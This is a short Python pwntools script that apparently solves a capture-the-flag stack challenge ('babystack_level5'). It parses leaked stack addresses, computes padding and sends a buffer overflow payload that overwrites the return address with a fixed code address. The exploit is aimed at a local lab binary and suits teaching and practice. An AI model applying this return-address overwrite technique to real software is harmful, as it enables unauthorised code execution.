from pwn import *


r = process("/challenge/babystack_level5")

r.recvuntil(b"base pointer rbp: ")
bp = int(r.recvline(keepends=False), 16)

r.recvuntil(b"will be stored: ")
buf = int(r.recvline(keepends=False), 16)
padding = bp - buf + 8

payload1 =  b'a'* padding + p64(0x4012bd)

payload2 =  b'a'* padding + p64(0x401305)

r.sendline(payload1)
# r.sendline(payload2)

r.interactive()